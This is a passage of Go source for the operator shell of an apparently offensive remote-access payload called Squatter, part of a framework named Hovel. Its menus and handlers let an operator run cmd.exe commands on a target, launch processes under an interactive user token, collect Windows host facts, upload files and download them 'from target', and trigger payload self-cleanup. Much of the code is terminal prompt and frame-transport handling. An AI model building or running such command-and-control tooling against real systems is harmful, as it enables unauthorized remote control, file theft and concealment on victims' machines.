// Package shell implements the interactive Squatter client shell shared by
// squatterctl and the Hovel Squatter provider session frontend.
package shell

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/wire"
	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/xfer"
	prompt "github.com/c-bata/go-prompt"
	"github.com/charmbracelet/lipgloss"
)

type Client struct {
	conn io.ReadWriteCloser
	r    *bufio.Reader
	mu   sync.Mutex
	sid  uint64
}

func New(conn io.ReadWriteCloser) *Client {
	return &Client{conn: conn, r: bufio.NewReader(conn)}
}

func (c *Client) nextSID() uint64 {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.nextSIDLocked()
}

func (c *Client) nextSIDLocked() uint64 { c.sid++; return c.sid }

// WithLockedTransport gives callers exclusive access to the Squatter frame
// transport. It lets Hovel run typed session tasks over the existing connection
// without interleaving frames with the interactive prompt.
func (c *Client) WithLockedTransport(fn func(conn io.Writer, reader *bufio.Reader, sid uint64) error) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	return fn(c.conn, c.r, c.nextSIDLocked())
}

func emit(out io.Writer, payload []byte) error {
	if err := writeFully(out, payload); err != nil {
		return err
	}
	return writeFully(out, []byte{'\n'})
}

func emitRaw(out io.Writer, payload []byte) error {
	return writeFully(out, payload)
}

func writeFully(out io.Writer, payload []byte) error {
	for len(payload) > 0 {
		n, err := out.Write(payload)
		if n > 0 {
			payload = payload[n:]
		}
		if err != nil {
			if isRetryableWriteError(err) {
				time.Sleep(5 * time.Millisecond)
				continue
			}
			return err
		}
		if n == 0 {
			return io.ErrShortWrite
		}
	}
	return nil
}

func writeLine(out io.Writer, args ...any) {
	if _, err := fmt.Fprintln(out, args...); err != nil {
		log.Printf("squatter shell: write line: %v", err)
	}
}

func writeText(out io.Writer, text string) {
	if _, err := fmt.Fprint(out, text); err != nil {
		log.Printf("squatter shell: write text: %v", err)
	}
}

func writeFormat(out io.Writer, format string, args ...any) {
	if _, err := fmt.Fprintf(out, format, args...); err != nil {
		log.Printf("squatter shell: write formatted text: %v", err)
	}
}

func logShellError(action string, err error) {
	if err != nil {
		log.Printf("squatter shell: %s: %v", action, err)
	}
}

const streamInteractiveRaw uint32 = 1

type streamStart struct {
	alive  bool
	active bool
	raw    bool
}

// Run drives the default interactive Squatter shell.
func (c *Client) Run(in io.Reader, out io.Writer) {
	input := bufio.NewReader(in)
	writeLine(out, "squatter shell -- run a module: <name> [args...]   (e.g. 'echo a b')")
	writeLine(out, "  echo <args...>                  open the echo module (interactive)")
	writeLine(out, "  cmd [command...]                open cmd.exe, or run one command through cmd.exe /c")
	writeLine(out, "  wininfo                         collect native Windows host facts")
	writeLine(out, "  process.list                    list processes")
	writeLine(out, "  process.run <command> [ms]      run a process with typed exit metadata")
	writeLine(out, "  process.run_as_user <command>   launch a process with an interactive user token")
	writeLine(out, "  payload.status                  show Squatter lifecycle status")
	writeLine(out, "  getfile <remote> [local]        download a file (fixed memory)")
	writeLine(out, "  putfile <local> <remote>        upload a file (fixed memory)")
	writeLine(out, "  quit                            exit; inside a module, Ctrl-D detaches")
	for {
		writeText(out, "squatter> ")
		line, err := input.ReadString('\n')
		if err == io.EOF {
			writeLine(out)
			return
		}
		cmd := strings.TrimSpace(line)
		if cmd == "" {
			continue
		}
		if cmd == "quit" || cmd == "exit" {
			return
		}
		parts := strings.Fields(cmd)
		sid := c.nextSID()
		var alive bool
		switch parts[0] {
		case "cmd":
			alive = c.runCommand(out, sid, "cmd", cmdArgsFromLine(cmd), input)
		case "getfile":
			alive = c.cmdGetfile(out, sid, parts[1:])
		case "putfile":
			alive = c.cmdPutfile(out, sid, parts[1:])
		default:
			alive = c.runCommand(out, sid, parts[0], parts[1:], input)
		}
		if !alive {
			return
		}
	}
}

// RunPrompt drives the rich local Squatter shell used by squatterctl. It uses
// go-prompt for history, editing, completion dropdowns, and terminal redraws.
func (c *Client) RunPrompt(title string) {
	s := &interactiveShell{client: c, title: title, out: os.Stdout, input: os.Stdin}
	s.runPrompt()
}

// RunPromptIO drives the rich Squatter shell through supplied PTY file
// descriptors. The custom parser/writer keep go-prompt pointed at the Hovel PTY
// instead of the daemon process terminal.
func (c *Client) RunPromptIO(input *os.File, output io.Writer, title string) {
	s := &interactiveShell{client: c, title: title, out: output, input: input}
	if terminal, ok := newPromptPTYTerminal(input, output); ok && s.runPTYPrompt(terminal) {
		return
	}
	s.runTerminalPromptLoop(input)
}

// RunDemo executes the scripted echo walkthrough used by squatterctl.
func (c *Client) RunDemo(out io.Writer) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if err := c.openStream(1, "echo", []string{"alpha", "beta", "gamma"}); err != nil {
		writeFormat(out, "[open failed: %v]\n", err)
		return
	}
	_, _, p, err := c.readDataOrClose()
	if err != nil {
		writeFormat(out, "[read failed: %v]\n", err)
		return
	}
	if err := emit(out, p); err != nil {
		logShellError("emit demo output", err)
		return
	}
	for _, msg := range []string{"hello", "world", "the quick brown fox"} {
		if err := wire.WriteFrame(c.conn, wire.KindData, 1, []byte(msg)); err != nil {
			writeFormat(out, "[write failed: %v]\n", err)
			return
		}
		_, _, p, err = c.readDataOrClose()
		if err != nil {
			writeFormat(out, "[read failed: %v]\n", err)
			return
		}
		if err := emit(out, p); err != nil {
			logShellError("emit demo output", err)
			return
		}
	}
	if err := wire.WriteFrame(c.conn, wire.KindData, 1, []byte("END")); err != nil {
		writeFormat(out, "[write failed: %v]\n", err)
		return
	}
	k, _, _, err := wire.ReadFrame(c.r)
	if err != nil {
		writeFormat(out, "[read failed: %v]\n", err)
		return
	}
	if k == wire.KindClose {
		writeLine(out, "[closed]")
	}
}

// RunStreams runs the parallel stream smoke mode used by squatterctl.
func (c *Client) RunStreams(out io.Writer, n int) {
	c.mu.Lock()
	defer c.mu.Unlock()
	for s := 0; s < n; s++ {
		if err := c.openStream(uint64(100+s), "echo", []string{fmt.Sprintf("task%d", s)}); err != nil {
			logShellError("open stream", err)
			return
		}
	}
	for i := 0; i < n; i++ {
		_, sid, p, err := c.readDataOrClose()
		if err != nil {
			logShellError("read stream", err)
			return
		}
		writeFormat(out, "stream %d: %s\n", sid, p)
	}
	for s := 0; s < n; s++ {
		if err := wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte(fmt.Sprintf("msg-%d", s))); err != nil {
			logShellError("write stream", err)
			return
		}
	}
	for i := 0; i < n; i++ {
		_, sid, p, err := c.readDataOrClose()
		if err != nil {
			logShellError("read stream", err)
			return
		}
		writeFormat(out, "stream %d echoed %q\n", sid, p)
	}
	for s := 0; s < n; s++ {
		if err := wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte("END")); err != nil {
			logShellError("close stream", err)
			return
		}
	}
}

func (c *Client) runCommand(out io.Writer, sid uint64, module string, args []string, in *bufio.Reader) bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.runCommandLocked(out, sid, module, args, in)
}

func (c *Client) runCommandLocked(out io.Writer, sid uint64, module string, args []string, in *bufio.Reader) bool {
	start := c.startStream(out, sid, module, args)
	if !start.alive || !start.active {
		return start.alive
	}
	if start.raw {
		return c.runRawLines(out, sid, in)
	}
	return c.runLineStream(out, sid, module, in)
}

func (c *Client) readDataOrClose() (uint16, uint64, []byte, error) {
	for {
		kind, sid, payload, err := wire.ReadFrame(c.r)
		if err != nil || kind != wire.KindControl {
			return kind, sid, payload, err
		}
	}
}

func (c *Client) startStream(out io.Writer, sid uint64, module string, args []string) streamStart {
	if err := c.openStream(sid, module, args); err != nil {
		writeLine(out, "[disconnected]")
		return streamStart{}
	}
	for {
		kind, _, payload, err := wire.ReadFrame(c.r)
		if err != nil {
			writeLine(out, "[disconnected]")
			return streamStart{}
		}
		switch kind {
		case wire.KindData:
			if err := emitRaw(out, payload); err != nil {
				writeLine(out, "[disconnected]")
				return streamStart{}
			}
		case wire.KindControl:
			event, err := wire.DecodeStreamEvent(payload)
			if err != nil {
				continue
			}
			if event.Kind == wire.EventInteractive {
				return streamStart{alive: true, active: true, raw: event.Code == streamInteractiveRaw}
			}
			if event.Kind == wire.EventError && event.Message != "" {
				writeFormat(out, "[%s error: %s]\n", module, event.Message)
			}
		case wire.KindClose:
			return streamStart{alive: true}
		}
	}
}

func (c *Client) runLineStream(out io.Writer, sid uint64, module string, in *bufio.Reader) bool {
	for {
		writeFormat(out, "%s> ", module)
		line, err := in.ReadString('\n')
		if errors.Is(err, io.EOF) {
			writeLine(out)
			logShellError("close line stream", wire.WriteFrame(c.conn, wire.KindClose, sid, nil))
			return c.drainUntilClose()
		}
		if err != nil {
			writeLine(out, "[disconnected]")
			return false
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			continue
		}
		if err := wire.WriteFrame(c.conn, wire.KindData, sid, []byte(line)); err != nil {
			writeLine(out, "[disconnected]")
			return false
		}
		if !c.readActiveResponse(out) {
			return false
		}
	}
}

func (c *Client) runRawLines(out io.Writer, sid uint64, in *bufio.Reader) bool {
	done := make(chan bool, 1)
	go c.drainStreamFrames(out, done)

	for {
		select {
		case alive := <-done:
			return alive
		default:
		}
		line, err := in.ReadString('\n')
		if len(line) > 0 {
			if err := wire.WriteFrame(c.conn, wire.KindData, sid, []byte(line)); err != nil {
				writeLine(out, "[disconnected]")
				return false
			}
		}
		if errors.Is(err, io.EOF) {
			select {
			case alive := <-done:
				return alive
			case <-time.After(50 * time.Millisecond):
			}
			logShellError("close raw stream", wire.WriteFrame(c.conn, wire.KindClose, sid, nil))
			return <-done
		}
		if err != nil {
			writeLine(out, "[disconnected]")
			return false
		}
	}
}

func (c *Client) readActiveResponse(out io.Writer) bool {
	for {
		kind, _, payload, err := wire.ReadFrame(c.r)
		if err != nil {
			writeLine(out, "[disconnected]")
			return false
		}
		switch kind {
		case wire.KindData:
			if err := emit(out, payload); err != nil {
				return false
			}
			return true
		case wire.KindControl:
			event, err := wire.DecodeStreamEvent(payload)
			if err == nil && event.Kind == wire.EventError && event.Message != "" {
				writeFormat(out, "[stream error: %s]\n", event.Message)
			}
		case wire.KindClose:
			return false
		}
	}
}

func (c *Client) drainStreamFrames(out io.Writer, done chan<- bool) {
	for {
		kind, _, payload, err := wire.ReadFrame(c.r)
		if err != nil {
			writeLine(out, "[disconnected]")
			done <- false
			return
		}
		switch kind {
		case wire.KindData:
			if err := emitRaw(out, payload); err != nil {
				done <- false
				return
			}
		case wire.KindControl:
			event, err := wire.DecodeStreamEvent(payload)
			if err != nil {
				continue
			}
			if event.Kind == wire.EventError && event.Message != "" {
				writeFormat(out, "[stream error: %s]\n", event.Message)
			}
		case wire.KindClose:
			done <- true
			return
		}
	}
}

func (c *Client) attachTerminal(input *os.File, out io.Writer, sid uint64) bool {
	done := make(chan bool, 1)
	go c.drainStreamFrames(out, done)
	restoreTerminal := enterAttachTerminal(input)
	defer restoreTerminal()

	buf := make([]byte, 1024)
	for {
		select {
		case alive := <-done:
			return alive
		default:
		}

		n, wouldBlock, err := readAttachTerminal(input, buf)
		if n > 0 {
			raw := append([]byte(nil), buf[:n]...)
			payload := bytes.ReplaceAll(raw, []byte{'\r'}, []byte{'\n'})
			if err := wire.WriteFrame(c.conn, wire.KindData, sid, payload); err != nil {
				writeLine(out, "[disconnected]")
				return false
			}
			if err := echoAttachInput(out, raw); err != nil {
				return false
			}
		}
		if wouldBlock {
			time.Sleep(10 * time.Millisecond)
			continue
		}
		if err == nil {
			continue
		}
		if errors.Is(err, io.EOF) {
			logShellError("close attached stream", wire.WriteFrame(c.conn, wire.KindClose, sid, nil))
			return <-done
		}
		writeLine(out, "[disconnected]")
		return false
	}
}

func echoAttachInput(out io.Writer, payload []byte) error {
	for _, b := range payload {
		switch b {
		case '\r', '\n':
			if err := writeFully(out, []byte{'\r', '\n'}); err != nil {
				return err
			}
		case 0x7f, '\b':
			if err := writeFully(out, []byte{'\b', ' ', '\b'}); err != nil {
				return err
			}
		case '\t':
			if err := writeFully(out, []byte{b}); err != nil {
				return err
			}
		default:
			if b >= 0x20 {
				if err := writeFully(out, []byte{b}); err != nil {
					return err
				}
			}
		}
	}
	return nil
}

func (c *Client) drainUntilClose() bool {
	for {
		kind, _, _, err := wire.ReadFrame(c.r)
		if err != nil {
			return false
		}
		if kind == wire.KindClose {
			return true
		}
	}
}

func cmdArgsFromLine(line string) []string {
	trimmed := strings.TrimSpace(line)
	if trimmed == "cmd" {
		return nil
	}
	rest, ok := strings.CutPrefix(trimmed, "cmd ")
	if !ok {
		return nil
	}
	rest = strings.TrimSpace(rest)
	switch {
	case rest == "":
		return nil
	case rest == "-i" || rest == "--interactive" || rest == "--debug":
		return []string{rest}
	case strings.HasPrefix(rest, "--interactive "):
		return []string{"--interactive", strings.TrimSpace(strings.TrimPrefix(rest, "--interactive "))}
	case strings.HasPrefix(rest, "-i "):
		return []string{"-i", strings.TrimSpace(strings.TrimPrefix(rest, "-i "))}
	case strings.HasPrefix(rest, "--debug "):
		return []string{"--debug", strings.TrimSpace(strings.TrimPrefix(rest, "--debug "))}
	default:
		return []string{rest}
	}
}

func moduleArgsFromLine(line string, parts []string) (string, []string) {
	if len(parts) == 0 {
		return "", nil
	}
	if parts[0] == "cmd" {
		return "cmd", cmdArgsFromLine(line)
	}
	return parts[0], parts[1:]
}

func (c *Client) cmdGetfile(out io.Writer, sid uint64, args []string) bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.cmdGetfileLocked(out, sid, args)
}

func (c *Client) cmdGetfileLocked(out io.Writer, sid uint64, args []string) bool {
	if len(args) < 1 {
		writeLine(out, "usage: getfile <remote-path> [local-path]")
		return true
	}
	remote := args[0]
	local := filepath.Base(strings.ReplaceAll(remote, "\\", "/"))
	if local == "" || local == "." {
		local = "download"
	}
	if len(args) > 1 {
		local = args[1]
	}
	f, err := os.Create(local)
	if err != nil {
		writeFormat(out, "[cannot create %s: %v]\n", local, err)
		return true
	}
	defer func() { logShellError("close downloaded file", f.Close()) }()
	n, err := xfer.GetFile(c.conn, c.r, sid, remote, f)
	if err != nil {
		writeFormat(out, "[getfile failed: %v]\n", err)
		return c.conn != nil
	}
	writeFormat(out, "got %s: %d bytes\n", local, n)
	return true
}

func (c *Client) cmdPutfile(out io.Writer, sid uint64, args []string) bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.cmdPutfileLocked(out, sid, args)
}

func (c *Client) cmdPutfileLocked(out io.Writer, sid uint64, args []string) bool {
	if len(args) < 2 {
		writeLine(out, "usage: putfile <local-path> <remote-path>")
		return true
	}
	local, remote := args[0], strings.Join(args[1:], " ")
	f, err := os.Open(local)
	if err != nil {
		writeFormat(out, "[cannot open %s: %v]\n", local, err)
		return true
	}
	defer func() { logShellError("close uploaded file", f.Close()) }()
	sent, ack, err := xfer.PutFile(c.conn, c.r, sid, f, remote)
	if err != nil {
		writeFormat(out, "[putfile failed: %v]\n", err)
		return false
	}
	if ack != "" {
		writeLine(out, ack)
	}
	writeFormat(out, "put %s -> %s: %d bytes\n", local, remote, sent)
	return true
}

func (c *Client) openStream(sid uint64, module string, args []string) error {
	return wire.WriteFrame(c.conn, wire.KindOpen, sid, wire.EncodeOpen(module, args))
}

type interactiveShell struct {
	client   *Client
	title    string
	out      io.Writer
	input    *os.File
	done     bool
	mu       sync.Mutex
	active   string
	activeID uint64
	raw      bool
	locked   bool
}

type promptTerminal interface {
	Setup() error
	TearDown() error
	Read() ([]byte, error)
	Writer() prompt.ConsoleWriter
}

func (s *interactiveShell) runPrompt(extraOptions ...prompt.Option) {
	s.printBanner()
	options := []prompt.Option{
		prompt.OptionTitle("squatterctl"),
		prompt.OptionLivePrefix(func() (string, bool) { return s.prefix(), true }),
		prompt.OptionPrefix("sq> "),
		prompt.OptionPrefixTextColor(prompt.Fuchsia),
		prompt.OptionInputTextColor(prompt.Turquoise),
		prompt.OptionSuggestionTextColor(prompt.White),
		prompt.OptionSuggestionBGColor(prompt.Black),
		prompt.OptionSelectedSuggestionTextColor(prompt.Black),
		prompt.OptionSelectedSuggestionBGColor(prompt.Fuchsia),
		prompt.OptionDescriptionTextColor(prompt.LightGray),
		prompt.OptionDescriptionBGColor(prompt.Black),
		prompt.OptionSelectedDescriptionTextColor(prompt.Black),
		prompt.OptionSelectedDescriptionBGColor(prompt.Turquoise),
		prompt.OptionScrollbarThumbColor(prompt.Turquoise),
		prompt.OptionScrollbarBGColor(prompt.Black),
		prompt.OptionMaxSuggestion(10),
		prompt.OptionSetExitCheckerOnInput(func(in string, breakline bool) bool {
			return breakline && s.done
		}),
	}
	options = append(options, extraOptions...)
	prompt.New(s.execute, s.complete, options...).Run()
}

func (s *interactiveShell) runPTYPrompt(terminal promptTerminal) bool {
	s.printBanner()
	if err := terminal.Setup(); err != nil {
		return false
	}
	defer func() {
		logShellError("tear down prompt terminal", terminal.TearDown())
	}()

	ui := newShellPromptUI(s, terminal.Writer())
	if err := ui.render(); err != nil {
		return false
	}

	var pending []byte
	for !s.done {
		data, err := terminal.Read()
		if err != nil {
			if isRetryableWriteError(err) {
				time.Sleep(10 * time.Millisecond)
				continue
			}
			return false
		}
		if len(data) == 0 {
			time.Sleep(10 * time.Millisecond)
			continue
		}
		pending = append(pending, data...)
		for len(pending) > 0 {
			event, rest, ok := ui.consume(pending)
			if !ok {
				break
			}
			pending = rest
			switch event.kind {
			case promptUIRender:
				if err := ui.render(); err != nil {
					return false
				}
			case promptUISubmit:
				if err := ui.breakLine(); err != nil {
					return false
				}
				if err := terminal.TearDown(); err != nil {
					logShellError("tear down prompt terminal", err)
					return false
				}
				s.execute(event.line)
				if s.done {
					return true
				}
				if err := terminal.Setup(); err != nil {
					return false
				}
				ui.resetInput()
				if err := ui.render(); err != nil {
					return false
				}
			case promptUIExit:
				s.done = true
				if err := ui.breakLine(); err != nil {
					return false
				}
				return true
			}
		}
	}
	return true
}

func (s *interactiveShell) runTerminalPromptLoop(input io.Reader) {
	reader := bufio.NewReader(input)
	for !s.done {
		if err := writeFully(s.output(), []byte(s.renderedPrefix())); err != nil {
			return
		}
		line, err := reader.ReadString('\n')
		if len(line) > 0 {
			s.execute(strings.TrimRight(line, "\r\n"))
		}
		if errors.Is(err, io.EOF) {
			return
		}
		if err != nil {
			writeLine(s.output(), errorStyle().Render("[disconnected]"))
			return
		}
	}
}

func (s *interactiveShell) printBanner() {
	out := s.output()
	hot := lipgloss.NewStyle().Foreground(lipgloss.Color("205")).Bold(true)
	cool := lipgloss.NewStyle().Foreground(lipgloss.Color("45")).Bold(true)
	muted := lipgloss.NewStyle().Foreground(lipgloss.Color("244"))
	writeLine(out, hot.Render("  ____   ___  _   _    _  _____ _____ _____ ____"))
	writeLine(out, hot.Render(" / ___| / _ \\| | | |  / \\|_   _|_   _| ____|  _ \\"))
	writeLine(out, hot.Render(" \\___ \\| | | | | | | / _ \\ | |   | | |  _| | |_) |"))
	writeLine(out, hot.Render("  ___) | |_| | |_| |/ ___ \\| |   | | | |___|  _ <"))
	writeLine(out, hot.Render(" |____/ \\__\\_\\\\___//_/   \\_\\_|   |_| |_____|_| \\_\\"))
	if strings.TrimSpace(s.title) != "" {
		writeLine(out, cool.Render("squatterctl ")+muted.Render(s.title))
	}
	writeLine(out, muted.Render("tab completes commands, arrows browse history, Ctrl-D exits, detach leaves a module"))
	writeLine(out)
}

func (s *interactiveShell) output() io.Writer {
	if s.out == nil {
		return os.Stdout
	}
	return s.out
}

func (s *interactiveShell) renderedPrefix() string {
	prefix := s.prefix()
	if prefix == "" {
		return ""
	}
	return lipgloss.NewStyle().Foreground(lipgloss.Color("205")).Render(prefix)
}

func (s *interactiveShell) prefix() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.active == "" {
		return "sq> "
	}
	if s.raw {
		return ""
	}
	return s.active + "> "
}

func (s *interactiveShell) execute(line string) {
	line = strings.TrimSpace(line)
	if line == "" {
		return
	}
	active, _, _ := s.activeState()
	if active != "" {
		s.executeActive(line)
		return
	}
	switch line {
	case "quit", "exit":
		s.done = true
		return
	case "help", "?":
		s.printHelp()
		return
	}
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return
	}
	sid := s.client.nextSID()
	switch parts[0] {
	case "getfile":
		if !s.client.cmdGetfile(s.output(), sid, parts[1:]) {
			s.done = true
		}
	case "putfile":
		if !s.client.cmdPutfile(s.output(), sid, parts[1:]) {
			s.done = true
		}
	default:
		module, args := moduleArgsFromLine(line, parts)
		s.client.mu.Lock()
		start := s.client.startStream(s.output(), sid, module, args)
		if !start.alive {
			s.client.mu.Unlock()
			s.done = true
			return
		}
		if !start.active {
			s.client.mu.Unlock()
			return
		}
		if start.raw && s.input != nil {
			if !s.client.attachTerminal(s.input, s.output(), sid) {
				s.done = true
			}
			s.client.mu.Unlock()
			return
		}
		s.setActive(module, sid, start.raw, true)
	}
}

func (s *interactiveShell) executeActive(line string) {
	_, activeID, raw := s.activeState()
	switch line {
	case "detach":
		logShellError("detach active stream", wire.WriteFrame(s.client.conn, wire.KindClose, activeID, nil))
		s.clearActive()
		return
	case "quit", "exit":
		logShellError("close active stream", wire.WriteFrame(s.client.conn, wire.KindClose, activeID, nil))
		s.done = true
		s.clearActive()
		return
	}
	payload := []byte(line)
	if raw {
		payload = append(payload, '\n')
	}
	if err := wire.WriteFrame(s.client.conn, wire.KindData, activeID, payload); err != nil {
		writeLine(s.output(), errorStyle().Render("[disconnected]"))
		s.done = true
		s.clearActive()
		return
	}
	if raw {
		return
	}
	if !s.client.readActiveResponse(s.output()) {
		s.clearActive()
	}
}

func (s *interactiveShell) complete(document prompt.Document) []prompt.Suggest {
	active, _, raw := s.activeState()
	if raw {
		return nil
	}
	return Suggestions(active, document.TextBeforeCursor())
}

func (s *interactiveShell) setActive(module string, sid uint64, raw bool, locked bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.active = module
	s.activeID = sid
	s.raw = raw
	s.locked = locked
}

func (s *interactiveShell) clearActive() {
	s.mu.Lock()
	locked := s.locked
	s.active = ""
	s.activeID = 0
	s.raw = false
	s.locked = false
	s.mu.Unlock()
	if locked {
		s.client.mu.Unlock()
	}
}

func (s *interactiveShell) activeState() (string, uint64, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.active, s.activeID, s.raw
}

func (s *interactiveShell) printHelp() {
	out := s.output()
	style := lipgloss.NewStyle().Foreground(lipgloss.Color("45")).Bold(true)
	muted := lipgloss.NewStyle().Foreground(lipgloss.Color("244"))
	writeLine(out, style.Render("commands"))
	writeLine(out, "  cmd [command...]          "+muted.Render("open cmd.exe, or run through cmd.exe /c"))
	writeLine(out, "  wininfo                   "+muted.Render("collect native Windows host facts"))
	writeLine(out, "  process.list              "+muted.Render("list processes"))
	writeLine(out, "  process.run <cmd> [ms]    "+muted.Render("run a process with exit metadata"))
	writeLine(out, "  process.run_as_user <command> "+muted.Render("launch with an interactive user token"))
	writeLine(out, "  payload.status            "+muted.Render("show Squatter lifecycle status"))
	writeLine(out, "  payload.cleanup           "+muted.Render("request Squatter self-cleanup"))
	writeLine(out, "  echo <args...>            "+muted.Render("open the echo module"))
	writeLine(out, "  getfile <remote> [local]  "+muted.Render("download from target"))
	writeLine(out, "  putfile <local> <remote>  "+muted.Render("upload to target"))
	writeLine(out, "  detach                    "+muted.Render("leave an active module"))
	writeLine(out, "  quit                      "+muted.Render("close squatterctl"))
}

func errorStyle() lipgloss.Style {
	return lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)
}

type promptUIEventKind int

const (
	promptUINone promptUIEventKind = iota
	promptUIRender
	promptUISubmit
	promptUIExit
)

type promptUIEvent struct {
	kind promptUIEventKind
	line string
}

type shellPromptUI struct {
	shell                  *interactiveShell
	writer                 prompt.ConsoleWriter
	line                   []rune
	cursor                 int
	history                []string
	historyIndex           int
	historyScratch         string
	completions            []prompt.Suggest
	completionIndex        int
	renderedCompletionRows int
}

func newShellPromptUI(shell *interactiveShell, writer prompt.ConsoleWriter) *shellPromptUI {
	return &shellPromptUI{
		shell:           shell,
		writer:          writer,
		historyIndex:    0,
		completionIndex: -1,
	}
}

func (ui *shellPromptUI) consume(input []byte) (promptUIEvent, []byte, bool) {
	if len(input) == 0 {
		return promptUIEvent{}, input, false
	}
	if input[0] == 0x1b {
		return ui.consumeEscape(input)
	}
	b := input[0]
	rest := input[1:]
	switch b {
	case '\r', '\n':
		line := string(ui.line)
		if strings.TrimSpace(line) != "" {
			ui.history = append(ui.history, line)
		}
		ui.historyIndex = len(ui.history)
		return promptUIEvent{kind: promptUISubmit, line: line}, rest, true
	case '\t':
		ui.complete()
		return promptUIEvent{kind: promptUIRender}, rest, true
	case 0x04:
		if len(ui.line) == 0 {
			return promptUIEvent{kind: promptUIExit}, rest, true
		}
	case 0x03:
		ui.resetInput()
		return promptUIEvent{kind: promptUIRender}, rest, true
	case 0x01:
		ui.cursor = 0
		return promptUIEvent{kind: promptUIRender}, rest, true
	case 0x05:
		ui.cursor = len(ui.line)
		return promptUIEvent{kind: promptUIRender}, rest, true
	case 0x7f, '\b':
		ui.backspace()
		return promptUIEvent{kind: promptUIRender}, rest, true
	default:
		if b >= 0x20 {
			ui.insertRune(rune(b))
			return promptUIEvent{kind: promptUIRender}, rest, true
		}
	}
	return promptUIEvent{kind: promptUINone}, rest, true
}

func (ui *shellPromptUI) consumeEscape(input []byte) (promptUIEvent, []byte, bool) {
	if len(input) < 3 {
		return promptUIEvent{}, input, false
	}
	if input[1] != '[' && input[1] != 'O' {
		return promptUIEvent{kind: promptUINone}, input[1:], true
	}
	switch input[2] {
	case 'A':
		ui.historyOlder()
	case 'B':
		ui.historyNewer()
	case 'C':
		if ui.cursor < len(ui.line) {
			ui.cursor++
		}
	case 'D':
		if ui.cursor > 0 {
			ui.cursor--
		}
	case 'H':
		ui.cursor = 0
	case 'F':
		ui.cursor = len(ui.line)
	case '3':
		if len(input) < 4 {
			return promptUIEvent{}, input, false
		}
		if input[3] == '~' {
			ui.deleteAtCursor()
			return promptUIEvent{kind: promptUIRender}, input[4:], true
		}
	}
	return promptUIEvent{kind: promptUIRender}, input[3:], true
}

func (ui *shellPromptUI) insertRune(r rune) {
	ui.clearCompletion()
	ui.line = append(ui.line, 0)
	copy(ui.line[ui.cursor+1:], ui.line[ui.cursor:])
	ui.line[ui.cursor] = r
	ui.cursor++
}

func (ui *shellPromptUI) backspace() {
	ui.clearCompletion()
	if ui.cursor == 0 {
		return
	}
	copy(ui.line[ui.cursor-1:], ui.line[ui.cursor:])
	ui.line = ui.line[:len(ui.line)-1]
	ui.cursor--
}

func (ui *shellPromptUI) deleteAtCursor() {
	ui.clearCompletion()
	if ui.cursor >= len(ui.line) {
		return
	}
	copy(ui.line[ui.cursor:], ui.line[ui.cursor+1:])
	ui.line = ui.line[:len(ui.line)-1]
}

func (ui *shellPromptUI) historyOlder() {
	ui.clearCompletion()
	if len(ui.history) == 0 || ui.historyIndex == 0 {
		return
	}
	if ui.historyIndex == len(ui.history) {
		ui.historyScratch = string(ui.line)
	}
	ui.historyIndex--
	ui.setLine(ui.history[ui.historyIndex])
}

func (ui *shellPromptUI) historyNewer() {
	ui.clearCompletion()
	if ui.historyIndex >= len(ui.history) {
		return
	}
	ui.historyIndex++
	if ui.historyIndex == len(ui.history) {
		ui.setLine(ui.historyScratch)
		return
	}
	ui.setLine(ui.history[ui.historyIndex])
}

func (ui *shellPromptUI) complete() {
	if len(ui.completions) == 0 {
		suggestions := Suggestions(ui.activeModule(), string(ui.line))
		if len(suggestions) == 0 {
			ui.clearCompletion()
			return
		}
		ui.completions = suggestions
		ui.completionIndex = 0
	} else {
		ui.completionIndex = (ui.completionIndex + 1) % len(ui.completions)
	}
	ui.replaceCurrentWord(ui.completions[ui.completionIndex].Text)
}

func (ui *shellPromptUI) replaceCurrentWord(value string) {
	start := ui.cursor
	for start > 0 && ui.line[start-1] != ' ' {
		start--
	}
	replacement := []rune(value)
	next := append([]rune{}, ui.line[:start]...)
	next = append(next, replacement...)
	next = append(next, ui.line[ui.cursor:]...)
	ui.line = next
	ui.cursor = start + len(replacement)
}

func (ui *shellPromptUI) activeModule() string {
	active, _, raw := ui.shell.activeState()
	if raw {
		return ""
	}
	return active
}

func (ui *shellPromptUI) setLine(line string) {
	ui.line = []rune(line)
	ui.cursor = len(ui.line)
}

func (ui *shellPromptUI) resetInput() {
	ui.line = nil
	ui.cursor = 0
	ui.historyIndex = len(ui.history)
	ui.historyScratch = ""
	ui.clearCompletion()
}

func (ui *shellPromptUI) clearCompletion() {
	ui.completions = nil
	ui.completionIndex = -1
}

func (ui *shellPromptUI) breakLine() error {
	ui.clearCompletion()
	if err := ui.render(); err != nil {
		return err
	}
	ui.writer.WriteRaw([]byte{'\r', '\n'})
	return ui.writer.Flush()
}

func (ui *shellPromptUI) render() error {
	ui.writer.HideCursor()
	ui.writer.WriteRaw([]byte{'\r'})
	ui.renderPromptLine()
	ui.clearRenderedCompletions()
	ui.renderCompletions()
	ui.writer.WriteRaw([]byte{'\r'})
	ui.writer.CursorForward(len([]rune(ui.shell.prefix())) + ui.cursor)
	ui.writer.ShowCursor()
	return ui.writer.Flush()
}

func (ui *shellPromptUI) renderPromptLine() {
	ui.writer.SetColor(prompt.Fuchsia, prompt.DefaultColor, true)
	ui.writer.WriteStr(ui.shell.prefix())
	ui.writer.SetColor(prompt.Turquoise, prompt.DefaultColor, false)
	ui.writer.WriteStr(string(ui.line))
	ui.writer.SetColor(prompt.DefaultColor, prompt.DefaultColor, false)
	ui.writer.EraseEndOfLine()
}

func (ui *shellPromptUI) clearRenderedCompletions() {
	for row := 0; row < ui.renderedCompletionRows; row++ {
		ui.writer.CursorDown(1)
